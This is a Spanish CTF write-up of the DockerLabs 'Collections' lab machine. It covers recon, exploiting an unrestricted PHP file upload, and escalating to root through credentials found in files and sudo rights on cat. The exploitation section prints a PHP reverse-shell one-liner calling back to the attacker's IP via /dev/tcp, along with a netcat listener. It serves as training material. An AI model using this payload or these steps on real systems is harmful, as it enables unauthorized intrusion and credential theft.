---
title: Collections
date: 2025-02-27
categories: [WRITEUPS, DockerLabs]
tags: []  # TAG names should always be lowercase
image: /assets/images/dockerlabs/collect1.png
---

En la máquina **Collections** de **DockerLabs** exploto un **Arbitrary File Upload** en el panel del admin, encuentro las credenciales de un usuario en un archivo que únicamente puede ser ejecutado por el usuario **root**, y escalo los máximos privilegios mediante los permisos de **sudo** del usuario.

---

En este ***Writeup*** se engloban las siguientes fases:

- **[Reconocimiento](#reconocimiento)**

- **[Explotación](#explotación)**

- **[Escalada de privilegios](#escalada-de-privilegios)**

---

Despliegue de la máquina

![picture](/assets/images/dockerlabs/collect2.png){: w="500" h="200" }

---

## **Reconocimiento**

Lo primero voy a lanzar un escaneo de puertos con `nmap`, para comprobar que puertos tiene abiertos.

```bash
nmap -p- --open --min-rate 5000 172.17.0.2 -n -Pn -oN allports
```

![picture](/assets/images/dockerlabs/collect3.png){: w="500" h="200" }

Voy a lanzar un segundo escaneo sobre los puertos encontrados para ver las versiones de los servicios, e intentar encontrar algo más de información con los scripts predeterminados de `nmap`.

```bash
nmap -p22,53,80 -sVC 172.17.0.2 -oN targeted
```

Y encontramos en el puerto `53` el servicio `ISC BIND`, que es un software de implementación de servidores `DNS` (Domain Name System).

![picture](/assets/images/dockerlabs/collect4.png){: w="500" h="200" }

Navegando por la web no encuentro nada interesante, únicamente encuentro el nombre de la empresa, que parece ser un nombre de un dominio.

![picture](/assets/images/dockerlabs/collect5.png)

Añado el nombre de la empresa **hackzones.hl** en el archivo `/etc/hosts` para que resuelva el nombre del dominio.

```bash
172.17.0.2 hackzones.hl
```

Y al introducirlo en el navegador, carga un panel de "**login**".

![picture](/assets/images/dockerlabs/collect6.png)

Realizando **Fuzzing** con la herramienta `Gobuster` sobre la ruta `http://hackzones.hl` encuentro los siguientes archivos y directorios.

```bash
gobuster dir -u http://hackzones.hl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html,md -b 403,404 --no-error
```

![picture](/assets/images/dockerlabs/collect7.png)

Después de inspeccionar lo encontrado, en la ruta `/dashboard.html` encuentro una panel del usuario **admin**, en el cual probando a subir un archivo con extensión `php` en la imagen del usuario, ha dado resultado y se ha acabado subiendo en la ruta `/uploads`, pasando antes por el archivo `uploads.php`.

Estamos ante un **Arbitrary File Upload**, que es la capacidad de subir archivos arbitrarios al servidor, en este caso gracias a la imagen del usuario **admin**, la cual no está sanitizada por extensiones de archivos, y al estar corriendo por la página el servicio `php`, nos va a poder ejecutar el código del archivo que subamos.

![picture](/assets/images/dockerlabs/collect8.png)

![picture](/assets/images/dockerlabs/collect9.png){: w="500" h="200" }

---
## **Explotación**

A continuación, la idea es subir un archivo con el código `php` correspondiente para entablar una **Reverse Shell** en nuestra máquina local, que es la capacidad de obtener una terminal interactiva del servidor en nuestra máquina local.

- Contenido de la **Reverse Shell**
	
	```php
	<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'"); ?>
	```

Subimos el archivo en la imagen del usuario admin, y comprobamos que se encuentra en el directorio `/uploads`.

![picture](/assets/images/dockerlabs/collect10.png){: w="500" h="200" }

Antes de ejecutar la **Reverse Shell** necesitamos abrir el puerto indicado en el archivo `shell.php` mediante un **Listener** con `ncat` para poder obtener la **Reverse Shell** en nuestra máquina local.

- Listener en la máquina local
	
	```bash
	nc -lnvp 4444
	```

Ejecutamos el archivo `shell.php` desde el navegador, y obtenemos acceso al servidor como el usuario `www-data`.

![picture](/assets/images/dockerlabs/collect11.png){: w="500" h="200" }

Realizo un tratamiento de la **TTY**, para tener una mejor interacción con la terminal.

```bash
script /dev/null -c bash
Ctrl + Z
export TERM=xterm
export SHELL=/bin/bash
stty rows 48 columns 188
reset
```

En el archivo `/authenticate.php` encuentro las credenciales del panel de "**login**" encontrado anteriormente.

![picture](/assets/images/dockerlabs/collect12.png){: w="500" h="200" }

Listando el contenido del archivo `/etc/passwd` filtrando por `bash`, para ver los usuarios que tienen asignados una `shell` de tipo `bash`, únicamente encuentro el usuario privilegiado `root`, y el usuario `mrrobot`.

![picture](/assets/images/dockerlabs/collect13.png){: w="500" h="200" }

---
## **Escalada de privilegios**

Navegando por las carpetas de la máquina, encuentro un archivo `secret.sh`, viendo su contenido me doy cuenta que es un script en **Bash** que verifica si se está ejecutando como usuario **root**, luego construye y muestra una cadena de texto basada en caracteres codificados en **hexadecimal**.

- Verificación del usuario **root**

	```bash
	if [ "$(id -u)" -ne 0 ];
	```

![picture](/assets/images/dockerlabs/collect14.png){: w="500" h="200" }

Al no poder ejecutarlo, la idea es llevarlo a mi máquina local para ejecutarlo como **root** y ver que me muestra.

Una vez en mi máquina local lo ejecuto como usuario **root**, y parece mostrar una contraseña como output.

![picture](/assets/images/dockerlabs/collect15.png){: w="500" h="200" }

Intentamos acceder vía `ssh` como el usuario **mrrobot**, y obtenemos acceso.

![picture](/assets/images/dockerlabs/collect16.png)

En el directorio `/opt` encuentro un archivo, el cual no puedo leer.

![picture](/assets/images/dockerlabs/collect17.png)

Listamos los permisos de `sudo` del usuario compruebo que tiene la capacidad de ejecutar `cat` como super usuario.

![picture](/assets/images/dockerlabs/collect18.png)

Viendo el contenido del archivo `SystemUpdate`, encuentro la contraseña del usuario **root**.

![picture](/assets/images/dockerlabs/collect19.png)

Finalmente migro al usuario **root** con la contraseña encontrada.

![picture](/assets/images/dockerlabs/collect20.png)